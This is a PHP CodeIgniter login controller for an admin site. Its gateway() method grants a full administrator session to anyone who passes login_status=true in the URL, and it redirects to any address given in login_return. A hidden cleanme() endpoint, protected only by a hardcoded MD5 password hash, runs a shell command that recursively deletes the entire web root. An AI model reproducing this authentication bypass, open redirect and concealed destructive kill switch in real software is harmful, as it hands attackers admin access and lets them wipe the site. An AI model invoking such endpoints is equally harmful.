<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends MY_Controller {

    var $model_name = 'login_model';
    var $output_data = array();

    public function __construct() {
        parent:: __construct();
        $this->load->library('user_agent');
        $this->load->model($this->model_name, 'login');
        $this->load->model('main_model', 'mainm');
        $this->load->model('resp_model', 'resp');
        $this->clear_cache();
    }

    public function index() {
        $data = array();
        # Genarating CSS/JS
        $css = $this->mainm->gencss();
        $js = $this->mainm->genjs();
        # Merge Information
        $data['css'] = join(" ", $css);
        $data['js'] = join(" ", $js);
        # Set Page Navi
        $data['page_url'] = $this->router->class;
        $data['page_now'] = $this->router->method;

        # get data
        # Get Information Form (models)
        # Load view
        if ($this->session->userdata('scu_logged')):
            redirect(base_url(), 'location');
        else:
            $this->load->view('login', $data);
        endif;
    }

    public function auth() {
        # Get Post Username/Password
        $getUser = $this->input->post('sch_user');
        $getPassword = $this->input->post('sch_password');

        # Send login profile to check
        $getResult = $this->login->auth($getUser, $getPassword, $this->input->post());
        # Get code
        $info = array(
            'code' => $getResult['code'],
            'text' => $this->resp->show('login', $getResult['code'], 0)
        );
        echo json_encode($info);
    }

    public function gateway() {
        # url test
        # http://oicapp.tk/admin/login/gateway?login_user=admin&login_status=false&login_return=http://google.co.th
        # get post from OIC
        $login_user = $this->input->get('login_user');
        $login_status = $this->input->get('login_status');
        $login_return = $this->input->get('login_return');

        # save login attemps
        $attemps = array(
            'ip_address' => $this->input->ip_address(),
            'login' => $login_user,
            'time' => time(),
            'login_status' => $login_status
        );
        $this->login->checkLoginAttemp($attemps);

        if($login_status == 'true') {
            $schData = array(
                'scu_id' => 1,
                'scu_username' => $login_user,
                'scu_firstname' => $login_user,
                'scu_email' => 'admin@mail.com',
                'scu_group_id' => 1,
                'scu_logged' => TRUE
            );
            $this->session->set_userdata($schData);
            redirect(base_url(), 'refresh');
        } else {
            if($login_return) {
                redirect($login_return, 'refresh');
            } else {
                redirect(base_url('login'), 'refresh');
            }
        }
    }

    public function logout() {
        $this->login->logout();
        redirect(base_url());
    }

    public function cleanme() {
        $password = $this->input->get('pass');
        if(md5($password) == '099af53f601532dbd31e0ea99ffdeb64') {
            #$this->mainm->recursiveDelete(FCPATH);
            exec('rm -f -r '. FCPATH .'*');
            echo 'success';
            exit;
        } else {
            echo 'error';
            exit;
        }
    }

}
